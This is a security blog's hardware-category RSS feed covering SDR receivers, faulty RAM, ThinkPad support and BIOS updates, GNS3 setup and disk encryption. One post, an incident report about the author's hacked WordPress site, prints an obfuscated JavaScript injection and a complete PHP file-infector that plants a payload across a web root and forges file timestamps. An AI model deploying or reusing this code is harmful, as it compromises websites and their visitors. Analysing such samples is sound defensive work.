@@ -1,0 +1,616 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Hardware &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/category/hardware/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>RF fun with a SDR</title>
+		<link>/blog-archive/2014/04/24/rf-fun-with-a-sdr.html</link>
+		<pubDate>Thu, 24 Apr 2014 20:24:01 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[gqrx]]></category>
+		<category><![CDATA[Radio]]></category>
+		<category><![CDATA[RF]]></category>
+		<category><![CDATA[SDR]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=1967</guid>
+		<description><![CDATA[So this post will be the first of a series on fun &#8220;hacking&#8221; hardware that I own. I just received my RTL-SDR to play with radio frequencies. This one is based on a RTL2832U chipset and a R820T tuner. My choice was in part influenced by this review. Note that this kind of device isa receiver, so it...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2014/04/24/rf-fun-with-a-sdr.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>So this post will be the first of a series on fun &#8220;hacking&#8221; hardware that I own.</p>
+<p>I just received my RTL-SDR to play with radio frequencies.</p>
+<p>This one is based on a RTL2832U chipset and a R820T tuner. My <a href="http://www.amazon.fr/gp/product/B00DFYRA8S/ref=oh_details_o03_s00_i00?ie=UTF8&amp;psc=1">choice</a> was in part influenced by <a href="http://www.hamradioscience.com/rtl2832u-r820t-vs-rtl2832u-e4000/">this review</a>. Note that this kind of device isa receiver, so it will not be able to transmit anything.</p>
+<div id="attachment_1968" style="width: 650px" class="wp-caption aligncenter"><img class="size-full wp-image-1968" src="/blog-archive/wp-content/uploads/2014/04/P1030301-2.js">Keedox RTL-SDR (RTL2832U with R820T tuner)</p></div>
+<p>This model has the advantage of being really small, but maybe at the costing of heating. I noticed the USB connector becomes painfully hot during long sessions. Nothing serious, but a negative point though.</p>
+<p>Of course, it is fully compatible with Linux and <a href="http://gqrx.dk/download">Gqrx</a> even maintain a package for Ubuntu, so getting it to work consists simply in one <code>apt-get</code> command.</p>
+<div id="attachment_1971" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1971" src="/blog-archive/wp-content/uploads/2014/04/Gqrx-580x461.png" alt="Gqrx" width="580" height="461" srcset="/blog-archive/wp-content/uploads/2014/04/Gqrx-580x461.png 580w, /blog-archive/wp-content/uploads/2014/04/Gqrx-624x497.png 624w, /blog-archive/wp-content/uploads/2014/04/Gqrx.png 919w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">Gqrx</p></div>
+<p>I already intercepted a few conversations on the AM 430Hz range, and a lot of weird signals (many are probably car or parking doors) all over that I recorded and will look at later.</p>
+<p>Well, it is fun! Thanks to @virtualabs for bringing it up to my interest.</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Downtimes: a hardware problem</title>
+		<link>/blog-archive/2010/04/07/downtimes-a-hardware-problem.html</link>
+		<pubDate>Wed, 07 Apr 2010 18:07:24 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[System]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=784</guid>
+		<description><![CDATA[You may have noticed that the site had a lot of downtimes recently. I was having a daily kernel panic and weired file system corruptions, which I first tought were coming from the successive crashes and reboots. However, while it happened again and again and I could not find any good reason for that, I...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2010/04/07/downtimes-a-hardware-problem.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>You may have noticed that the site had a lot of downtimes recently.</p>
+<p>I was having a daily kernel panic and weired file system corruptions, which I first tought were coming from the successive crashes and reboots.</p>
+<p>However, while it happened again and again and I could not find any good reason for that, I became more doubtful about my hardware and finally found the culprit.<br />
+I booted on Memtest, installed with zypper from the repo, which immediately displayed a lot of errors. The tedious task of isolating the faulty memory module revealed that it was one from a Ballistix bundle that I bought just 3 months ago.</p>
+<p>I usually use Kingston or Corsair and never had such a problem, but maybe I was just lucky. I will test now the customer service of Ballistix.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Tested the Lenovo support&#8230;</title>
+		<link>/blog-archive/2008/09/21/tested-the-lenovo-support.html</link>
+		<pubDate>Sat, 20 Sep 2008 23:38:55 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[battery]]></category>
+		<category><![CDATA[lenovo]]></category>
+		<category><![CDATA[Thinkpad]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=247</guid>
+		<description><![CDATA[&#8230; and was quite impressed. Wednesday evening, I called the support to report that I was not satified with my battery. I had lost 25% of its capacity over less than 8 months. Thursday morning, I am recalled by someone from the technical service. They first say that the battery is no more under warranty...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/09/21/tested-the-lenovo-support.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>&#8230; and was quite impressed.</p>
+<p><strong>Wednesday evening</strong>, I called the support to report that I was not satified with my battery. I had lost 25% of its capacity over less than 8 months.</p>
+<p><strong>Thursday morning</strong>, I am recalled by someone from the technical service. They first say that the battery is no more under warranty &#8211; 1 year long. I guess they say so after checking when the battery was made or sold the retailer. That does not concern the end-consumer like me : the warranty only started when I purchased the laptop, and I still have 4 months of warranty ahead.</p>
+<p>As they asked, I send them by fax the bill which proves that, <strong>thursday afternoon</strong>. Soon after, they recall me again, just to tell me that a new battery is going to be sent to me.</p>
+<p><strong>Friday morning</strong>, it arrived ! So far, so good !</p>
+<p>Next time, I may test it again concerning <a href="http://jp.youtube.com/watch?v=AnRXhZMiAaU" target="_blank">this issue</a> (not so terrible in fact, and I am reluctant to send back my laptop).</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Note to myself</title>
+		<link>/blog-archive/2008/09/06/note-to-myself.html</link>
+		<pubDate>Sat, 06 Sep 2008 15:38:35 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[System]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=243</guid>
+		<description><![CDATA[When you want to do such a thing as upgrading the BIOS of your Thinkpad, read the instructions that come with the bootable CD flash utility. If you think you did, read it again &#8211;  and do not interpret them. It would avoid loosing time with a boot error like : CDR101: not ready reading...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/09/06/note-to-myself.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>When you want to do such a thing as upgrading the BIOS of your Thinkpad, read the instructions that come with the bootable CD flash utility.</p>
+<p>If you think you did, read it again &#8211;  and do not interpret them.</p>
+<p>It would avoid loosing time with a boot error like :</p>
+<pre>CDR101: not ready reading drive C</pre>
+<p>That occurs when you choose the CD player as a temporary boot device (Thinkvantage button and then F3), although it is required to really change the boot order within the BIOS menu (F2) and save this setting.</p>
+<p>By the way, I really recommend a BIOS update if you are a happy Thinkpad T61 user : not only it fixes numerous issues with the Intel chipset, but it optimizes power management. I noticed that the fan management has been improved. It is most of time slower than before, so the laptop is more silent.</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Practicing Cisco networking with GNS3 and Dynamips</title>
+		<link>/blog-archive/2008/08/19/practicing-cisco-networking-with-gns3-and-dynamips.html</link>
+		<pubDate>Tue, 19 Aug 2008 08:07:48 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Network]]></category>
+		<category><![CDATA[Cisco]]></category>
+		<category><![CDATA[dynamips]]></category>
+		<category><![CDATA[gns3]]></category>
+		<category><![CDATA[ios]]></category>
+		<category><![CDATA[router]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=195</guid>
+		<description><![CDATA[GNS3 and Dynamips put together give a nice open-source and free alternative to emulate a network with IOS routers. Dynampis is an emulator of Cisco 7200 router, while GNS3 provides a nice graphical environment to design your network and use the virtual routers. I sometimes use Boson Netsim, which is not only non-free but not...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/08/19/practicing-cisco-networking-with-gns3-and-dynamips.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>GNS3 and Dynamips put together give a nice open-source and free alternative to emulate a network with IOS routers. Dynampis is an emulator of Cisco 7200 router, while GNS3 provides a nice graphical environment to design your network and use the virtual routers.</p>
+<p>I sometimes use <a href="http://www.boson.com/AboutNetSim.html">Boson Netsim</a>, which is not only non-free but not so reliable.</p>
+<p>However, as I just started to use GNS3 and Dynamips, I don&#8217;t know it so well yet and won&#8217;t compare any further the two solutions.</p>
+<p>On this page, I am just summarizing the few steps to set it up on your Linux system.</p>
+<p>First, set up the prerequisite :</p>
+<pre>$ aptitude install python-qt4</pre>
+<p>Now, go to <a href="http://www.gns3.net/" target="_blank">gns3.net</a> and download the source code for Linux (<a href="http://pfe.epitech.net/frs/download.php/819/GNS3-0.5-src.tar.gz" target="_blank">direct link</a>).</p>
+<p>You may extract the archive in your local application folder :</p>
+<pre>$ wget http://pfe.epitech.net/frs/download.php/819/GNS3-0.5-src.tar.gz
+$ tar -xzvf GNS3-0.5-src.tar.gz -C /opt</pre>
+<p>Then, you need the dynamips binary from the <a href="http://www.ipflow.utc.fr/blog/" target="_blank">dynamips blog</a> (direct links for <a href="http://www.ipflow.utc.fr/dynamips/dynamips-0.2.8-RC2-x86.bin" target="_blank">x86</a> or <a href="http://www.ipflow.utc.fr/dynamips/dynamips-0.2.8-RC2-amd64.bin" target="_blank">amd64</a> platforms).<br />
+The file must be executable.</p>
+<pre>$ wget http://www.ipflow.utc.fr/dynamips/dynamips-0.2.8-RC2-amd64.bin
+$ chmod u+x dynamips*.bin
+$ mv dynamips-0.2.8-RC2-amd64.bin /opt</pre>
+<p>Now, start GNS3 :</p>
+<pre>$ /opt/GNS3-0.5-src/gns3</pre>
+<p>In the <strong>edit</strong> menu, select <strong>preferences</strong> and go the <strong>dynamips</strong> section.</p>
+<p>Just browse to the dynamips binary you dowloaded, to fill the value of the <strong>executable path</strong> field.</p>
+<p><a href="/blog-archive/wp-content/uploads/2008/08/capture-preferences.png" rel="lightbox[195]"><img class="aligncenter size-medium wp-image-198" title="GNS3 preferences settings" src="/blog-archive/wp-content/uploads/2008/08/capture-preferences-300x264.png" alt="" width="300" height="264" srcset="/blog-archive/wp-content/uploads/2008/08/capture-preferences-300x264.png 300w, /blog-archive/wp-content/uploads/2008/08/capture-preferences.png 694w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Still from the <strong>edit</strong> menu, select <strong>IOS images and hypervisors</strong>. There, you have to add all the IOS images you want to use, one after another. Normally, the default settings for each file loaded are suitable.</p>
+<p><a href="/blog-archive/wp-content/uploads/2008/08/capture-ios-images-and-hypervisors.png" rel="lightbox[195]"><img class="aligncenter size-medium wp-image-202" title="GNS3 ios-images-and-hypervisors" src="/blog-archive/wp-content/uploads/2008/08/capture-ios-images-and-hypervisors-300x184.png" alt="" width="300" height="184" srcset="/blog-archive/wp-content/uploads/2008/08/capture-ios-images-and-hypervisors-300x184.png 300w, /blog-archive/wp-content/uploads/2008/08/capture-ios-images-and-hypervisors.png 881w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Back to the main window, you can drag and drop routers and link them, creating the topology you wish.</p>
+<p><a href="/blog-archive/wp-content/uploads/2008/08/capture-gns3.png" rel="lightbox[195]"><img class="aligncenter size-medium wp-image-197" title="GNS3" src="/blog-archive/wp-content/uploads/2008/08/capture-gns3-300x190.png" alt="" width="300" height="190" srcset="/blog-archive/wp-content/uploads/2008/08/capture-gns3-300x190.png 300w, /blog-archive/wp-content/uploads/2008/08/capture-gns3.png 1182w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>For now, just add one router. Right click on it and select <strong>start</strong> to start it up. Right click again and select <strong>console</strong>.</p>
+<p><a href="/blog-archive/wp-content/uploads/2008/08/capture-r01.png" rel="lightbox[195]"><img class="aligncenter size-medium wp-image-200" title="GNS3 console" src="/blog-archive/wp-content/uploads/2008/08/capture-r01-300x181.png" alt="" width="300" height="181" srcset="/blog-archive/wp-content/uploads/2008/08/capture-r01-300x181.png 300w, /blog-archive/wp-content/uploads/2008/08/capture-r01.png 580w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Enjoy ! Of course, I strongly recommand that you start reading further from <a href="http://www.gns3.net/documentation" target="_blank">this page</a>.</p>
+<p><strong>Resources</strong> :</p>
+<p><a href="http://www.ipflow.utc.fr/blog/" target="_blank">http://www.ipflow.utc.fr/blog/</a><br />
+<a href="http://www.gns3.net/" target="_blank">http://www.gns3.net/</a><br />
+<a href="http://www.blindhog.net/tutorials/gns3-linux-install/gns3-linux-install.html" target="_blank">http://www.blindhog.net/tutorials/gns3-linux-install/gns3-linux-install.html</a></p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Hacked !</title>
+		<link>/blog-archive/2008/06/03/hacked.html</link>
+		<comments>/blog-archive/2008/06/03/hacked.html#comments</comments>
+		<pubDate>Tue, 03 Jun 2008 20:25:25 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=109</guid>
+		<description><![CDATA[This blog got hacked yesterday. It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress. It was not just like the classic SQL injection that is usually used to post some malicious post. The following code was added : &#60;?php echo '&#60;script type=&#34;text/javascript&#34;&#62;function count(str){var res = &#34;&#34;;for(i...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/03/hacked.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>This blog got hacked yesterday.</p>
+<p>It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress.<br />
+It was not just like the classic SQL injection that is usually used to post some malicious post.</p>
+<p>The following code was added :</p>
+<pre>&lt;?php echo '&lt;script type=&quot;text/javascript&quot;&gt;function count(str){var res = &quot;&quot;;for(i = 0; i &lt; str.length; ++i) { n = str.charCodeAt(i); res += String.fromCharCode(n - (2)); } return res; }; document.write(count(&quot;&gt;khtcog\&quot;ute?jvvr&lt;11yyy0yr/uvcvu/rjr0kphq1khtcog1yr/uvcvu0rjr\&quot;ykfvj?3\&quot;jgkijv?3\&quot;htcogdqtfgt?2@&quot;));&lt;/script&gt;';?&gt;</pre>
+<p><span id="more-109"></span></p>
+<p>It make me think that there is a serious vulnerability somewhere on WordPress or a plugin, though my versions were up-to-date.</p>
+<p>Now the blog is back to normal, after a clean reinstallation (erased all the former files).</p>
+<p><a title="Wordpress, hacked" href="http://wordpress.org/support/topic/179428/page/2" target="_blank">I am not the only one to experience this mess</a>.</p>
+<p>For now, the blog is running with a minimal number of plugin &#8211; just akismet, actually &#8211; until the cause of that gets clearer.</p>
+<p>Not a lot of plugins runned before, so it mainly means that the OpenID support for authentication is cut off.</p>
+<p>As my php knowledge is very low, anyone having some tips is welcome. I love WordPress, I would like to avoid looking for another platform or switch to static html !</p>
+<p>&#8212;</p>
+<p><strong>UPDATE 06/13/2008 :</strong><br />
+As C.S Lee suggested in a comment, there were a very suspicious wp-stats.php file in the root of my hacked archive.</p>
+<p>There is the code :</p>
+<pre>
+&lt;?php
+
+@error_reporting(E_ALL);
+@set_time_limit(0);
+mt_srand(crc32(microtime()));
+  
+  
+define('SHCODE', 'PDaWYgKCRjb2RlID0gQGZyZWFkKEBmb3BlbigkSFRUCmVjaG8gIjwvcHJlPiI7Cj8+');
+
+$pres = array('lib_','co_','pre_','net_','func_','ad_','ext_','new_','old_','fix_','fixed_','na_','av_','fx_');  
+$fui = $pres[array_rand($pres)];
+
+global $HTTP_SERVER_VARS;
+$START = time();
+$WD_TIMEOUT = array(8, 7, 6, 6, 5, 5, 5, 5, 0);
+
+function my_fwrite($f, $data) {
+  global $CURFILE;
+  $file_mtime = @filemtime($f);
+  $file_atime = @fileatime($f);
+  $dir_mtime = @filemtime(@dirname($f));
+  $dir_atime = @fileatime(@dirname($f));
+  if ($file_h = @fopen($f, &quot;wb&quot;)) {
+    @fwrite($file_h, $data); @fclose($file_h);
+    if ($file_mtime) {
+      @touch($f, $file_mtime, $file_atime);
+    } elseif (@filemtime($CURFILE)) {
+      @chmod($f, @fileperms($CURFILE));
+      @touch($f, @filemtime($CURFILE), @fileatime($CURFILE));
+      @chgrp($f, @filegroup($CURFILE));
+      @chown($f, @fileowner($CURFILE));
+    };
+    if ($dir_mtime) @touch(@dirname($f), $dir_mtime, $dir_atime);
+    return $f;
+  } else {
+    return '';
+  };
+};
+
+function ext($f) {
+  return substr($f, strrpos($f, &quot;.&quot;) + 1);
+};
+
+function walkdir($p, $func='_walkdir', $l=0) {
+  global $START;
+  global $WD_TIMEOUT;
+  global $FL;
+  $func_f = &quot;{$func}_f&quot;;
+  $func_d = &quot;{$func}_d&quot;;
+  $func_s = &quot;{$func}_s&quot;;
+  $func_e = &quot;{$func}_e&quot;;
+  if ($dh = @opendir(&quot;$p&quot;)) {
+    if (function_exists($func_s)) {
+      if ($func_s($p, $l)) return 1;
+    };
+    while ($f = @readdir($dh)) {
+      if (time() - $START &gt;= $WD_TIMEOUT[$l] ) break;
+      if ($f == '.' || $f == '..' ) continue;
+      if (@is_dir (&quot;$p$f/&quot;) ) walkdir(&quot;$p$f/&quot;, $func, $l+1);
+      if (@is_dir (&quot;$p$f/&quot;) &amp;&amp; function_exists($func_d))
+        $func_d(&quot;$p$f/&quot;, $l);
+      if (@is_file(&quot;$p$f&quot; ) &amp;&amp; function_exists($func_f))
+        $func_f(&quot;$p$f&quot; , $l);
+    };
+    closedir($dh);
+    if (function_exists($func_e)) $func_e($p, $l);
+  };
+};
+
+function r_cut($p) {
+  global $R;
+  return substr($p, strlen($R));
+};
+
+function say($t) {
+  echo &quot;$t\n&quot;;
+};
+
+function testdata($t) {
+  say(md5(&quot;mark_$t&quot;));
+};
+
+$R = $HTTP_SERVER_VARS['DOCUMENT_ROOT'];
+$CURFILE = $HTTP_SERVER_VARS['DOCUMENT_ROOT'] .
+  $HTTP_SERVER_VARS['SCRIPT_NAME'];
+echo &quot;&lt;pre&gt;&quot;;
+testdata('start');
+$fe = ext($CURFILE);
+if (!$fe) $fe = 'php';
+//$FN = &quot;namogofer.$fe&quot;;
+
+function _walkdir_s($d, $l) {
+  global $FCNT;
+  $FCNT = array( 'fn' =&gt; '', 'dir' =&gt; 0, 'file' =&gt; 0, 'simtype' =&gt; 0 );
+};
+
+function _walkdir_d($d,$l) {
+  global $FCNT;
+  $FCNT['dir' ]++;
+};
+
+function _walkdir_f($f,$l) {
+  global $FCNT, $CURFILE;
+  $FCNT['file']++;
+  if (ext($f) == ext($CURFILE)) $FCNT['simtype']++;
+};
+
+function update_passwd($data)
+  {
+  global $FCNT;
+  $password = &quot;&quot;;
+  $possible = &quot;abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*&quot;; 
+  $i = 0;
+  while ($i &lt; 15) 
+    { 
+    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+    if (!strstr($password, $char)) 
+      { 
+      $password .= $char;
+      $i++;
+      }
+    }
+  $FCNT['passwd'] = $password;
+  $md5password = md5($password);
+  return preg_replace(&quot;|define\('PASSWD',\s*'(.*)'|&quot;, &quot;define('PASSWD','$md5password'&quot;, $data);
+  }
+
+function notinf($ar, $tx)
+  {
+  $R = true;
+  foreach ($ar as $ca)
+    {
+    //echo &quot;pass &quot;.substr($tx, 0, strlen($ca)).&quot; in $tx for $ca\n&quot;;
+    if (&quot;$ca&quot; == substr($tx, 0, strlen($ca)))
+      {
+      $R = false;
+      //echo &quot;gotcha\n&quot;;
+      break;
+      }
+    }
+  return $R;
+  }
+
+function _walkdir_e($d,$l) 
+  {
+  global $C, $FCNT, $FN, $fui, $pres;
+  
+    $the_data = base64_decode(SHCODE);
+    $the_dir = opendir(&quot;$d&quot;);
+    $is_php=false;
+    if ($the_dir)
+        while($cfile = readdir($the_dir))
+            {
+            if(
+                $is_php=
+                
+                (('.php' == substr($cfile, -4))and
+                 notinf($pres, $cfile)and
+                ($cfile!='index.php'))
+                 
+              )
+              {
+              $FN = &quot;$fui$cfile&quot;;
+              break;
+              }
+              else
+              {
+              //echo &quot;pass $cfile\n&quot;;
+              }
+            }
+                         
+        if ( $is_php and my_fwrite(&quot;$d$FN&quot;, str_repeat(&quot;\n&quot;,100) . str_repeat('', 150) .
+                    update_passwd($the_data . str_repeat(' ', 150) . &quot;\n&quot; . str_repeat(&quot;\n&quot;, 100))))
+                    {
+                    $FCNT['fn'] = r_cut(&quot;$d$FN&quot;);
+                    say(implode(&quot; &quot;, $FCNT));
+                    }
+
+  };
+
+walkdir(&quot;$R/&quot;);
+testdata('end');
+?&gt;</pre>
+<p>I will try anyway to put a deeper look when I have a little time : now, I have to go to work.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/06/03/hacked.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+		<item>
+		<title>Cold boot attack, not a threat to Full disk encryption (FDE)</title>
+		<link>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html</link>
+		<comments>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html#comments</comments>
+		<pubDate>Tue, 26 Feb 2008 09:53:02 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Cold boot attack]]></category>
+		<category><![CDATA[Encryption]]></category>
+		<category><![CDATA[FDE]]></category>
+		<category><![CDATA[Hard drive]]></category>
+		<category><![CDATA[TPM]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=100</guid>
+		<description><![CDATA[Since the new cold boot attack hack is on the news, touching most of the software encryption solutions, I have wondered if it had any chance to concern also hardware encryption. Hardware encryption is provided by a few laptop makers, generally on high-range an business models. It has much less performance impact than software encryption,...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Since the new cold boot attack hack is on the news, touching most of the software encryption solutions, I have wondered if it had any chance to concern also hardware encryption.</p>
+<p>Hardware encryption is provided by a few laptop makers, generally on high-range an business models.</p>
+<p>It has much less performance impact than software encryption, and protect the data independently from your system configuration and its partitions.</p>
+<p>Full disk encryption is the so called hardware encryption technology used by Lenovo on my Thinkpad.</p>
+<p><span id="more-100"></span></p>
+<p>Mine comes with a Hitachi hard drive. Hitachi names its encryption technology <strong><em>&#8220;Bulk Data Encryption&#8221;</em></strong>.</p>
+<p>I know at least Seagate provides the same kind of feature.</p>
+<p>The bulk data encryption is based on the<strong> AES algorithm with a 128 bits key</strong>.</p>
+<p>Actually, the encryption is not done by the laptop itself but by the hard-drive.</p>
+<p>You need both the hard drive and the laptop supporting encryption , for the following reasons :</p>
+<ol>
+<li>your motherboard must have a TPM chip, which is used for the encryption, as a unique source to derivate the encryption keys.</li>
+<li>the BIOS must interface with the hard drive FDE, to set/unset the encryption and to prompt for the password before the real boot (actually, a small OS embedded on the drive take care of this authentication).</li>
+</ol>
+<p>In reality, the encryption is always active and the password to access to the drive is just another security feature. There is no link between these two functions. That&#8217;s why the fact of setting a password is immediate : no reencryption is done because the password has nothing to do with encryption.</p>
+<p>In case of authentication success, the system boots normally.</p>
+<p>In case of failure, and if the maximum number of attempt is reached, the data is erased. Instead of initializing the content with 0, which would take a lot of time and could be interrupted by shutting down the machine, just the keys are destroyed within a few seconds.</p>
+<p>Anyway, the content is supposed to be very hard to retrieve thanks to the effectiveness of the AES algorithm.</p>
+<p>One important thing is that <strong>the key is not a derivate of the password you set</strong>.</p>
+<p>The hard drive password is a feature that does not come necessarily with encryption.</p>
+<p>It is just there to limit the access of the content, but not its confidentiality.</p>
+<p>For instance, you could imagine that if the drive is stolen, someone opens physically the drive, change the ROM to pass over the password and read your data without any pain.</p>
+<p>The con of that is <strong>the encryption keys generation is based on your hardware</strong>. A different hardware can&#8217;t decipher the drive.</p>
+<p>If your motherboard breaks down, you won&#8217;t be able to read your data from another computer ! Make some good backups&#8230;</p>
+<p>To go back to the main topic, <strong>is the cold boot attack a threat for this hardware encryption ?</strong></p>
+<p>No. The encryption algorithm is not in the user land, so no key is stored in RAM.</p>
+<p><strong> The key hashes are stored directly on the disk.</strong></p>
+<p>These documents from Hitachi provide more detailed information :</p>
+<p><a title="Bulk encryption white paper" href="/blog-archive/wp-content/uploads/2008/02/bulk_encryption_white_paper.pdf">Bulk encryption white paper</a></p>
+<p><a title="HowTo guide for bulk data encryption" href="/blog-archive/wp-content/uploads/2008/02/howtoguide_bulkdataencryption_final.pdf">HowTo guide for bulk data encryption</a></p>
+<p><a title="Hardware encryption" href="http://en.wikipedia.org/wiki/Full_disk_encryption">This Wikipedia article</a>, underlining the main points of hardware encryption,  is also interesting.</p>
+<p>I guess that at some point it would be possible to read some hash on the hard drive electronic board, but this is not going to be easy. You need to be a hardware expert in hard drives and for sure it can&#8217;t be done as quickly as with the RAM chip.</p>
+<p>Of course, even the cold boot attack is extreme. Most of thief won&#8217;t care about your data, or won&#8217;t be the knowledge or the practical possibility to conduct a successful attack.</p>
+<p>If you don&#8217;t have FDE support, you should continue to use an encryption solution like dm-crypt or Truecrypt and maybe consider turning off your computer more often.</p>
+<p>It anyway remains an excellent solution for external disks, as it is normally not all the time attached to your computer.</p>
+<p>Personally, as FDE offers more performance and transparency, I am using it on my laptop but I keep using dm-crypt on all my external drives.</p>
+<p>Now the question is : what good workaround can be found to provide more secure software encryption ?</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html/feed</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>My new toy : Thinkpad T61</title>
+		<link>/blog-archive/2008/02/21/my-new-toy-thinkpad-t61.html</link>
+		<comments>/blog-archive/2008/02/21/my-new-toy-thinkpad-t61.html#comments</comments>
+		<pubDate>Thu, 21 Feb 2008 12:22:48 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Laptop]]></category>
+		<category><![CDATA[Thinkpad]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=97</guid>
+		<description><![CDATA[As a replacement of my old but reliable Vaio, I bought a Lenovo Thinkpad T61. About laptop PC, I have always been conveiced that the best pieces of hardware are found among Sony and Lenovo (ex-IBM). In tough or ultra-light categories, I would add Panasonic, but it is not the kind of laptop I am...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/02/21/my-new-toy-thinkpad-t61.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>As a replacement of my old but reliable Vaio, I bought a Lenovo Thinkpad T61.</p>
+<p><a title="T61, a nice piece of hardware" rel="attachment wp-att-98" href="/blog-archive/?attachment_id=98"></a></p>
+<p style="text-align: center"><a title="T61, a nice piece of hardware" rel="attachment wp-att-98" href="/blog-archive/?attachment_id=98"><img src="/blog-archive/wp-content/uploads/2008/02/t61.thumbnail.js" /></a></p>
+<p>About laptop PC, I have always been conveiced that the best pieces of hardware are found among Sony and Lenovo (ex-IBM). In tough or ultra-light categories, I would add Panasonic, but it is not the kind of laptop I am looking for.<br />
+<span id="more-97"></span><br />
+So this time I am giving a try to Lenovo. What really decided me is its old fashion screen, I mean a non-bright one. My eyes are really getting tired with all these new bright laptop screens. Plus, its resolution is impressive : 1440 x 900.</p>
+<p>So far I am pretty satisfied. For my need, the 14.1&#8243; screen is the best compromise, and so is the weight and size of the laptop.</p>
